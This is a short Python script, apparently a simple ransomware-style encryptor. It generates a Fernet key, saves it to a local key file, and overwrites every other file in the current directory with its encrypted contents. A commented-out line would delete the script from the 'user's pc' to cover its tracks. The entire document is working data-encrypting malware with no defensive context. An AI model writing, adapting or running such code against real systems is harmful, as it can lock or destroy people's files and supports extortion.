import os
from sys import argv
from cryptography.fernet import Fernet

# empty list that will save the names of all files in the directory
files = []

# loop through names of all files and folders in the directory
for file in os.listdir():
    # check that the selected element is a file and not:
    # 1. encryption file
    # 2. decryption file
    # 3. encryption key file
    if os.path.isfile(file) and file != "encrypt.py" and file != "encryption-key.key" and file != "decrypt.py":
        # append file names to the list 'files
        files.append(file)

# generate an encryption key
key = Fernet.generate_key()

# save encryption key in a key file
with open("encryption-key.key", "wb") as key_file:
    key_file.write(key)

# loop over file names saved to 'files' list
for file in files:
    # open files one by one and read contents
    with open(file, "rb") as encryption_file:
        contents = encryption_file.read()
    # encrypt file content
    encrypted_contents = Fernet(key).encrypt(contents)
    # write encrypted content to the file
    with open(file, "wb") as encryption_file:
        encryption_file.write(encrypted_contents)

# delete encryption script from user's pc
# os.remove(argv[0])
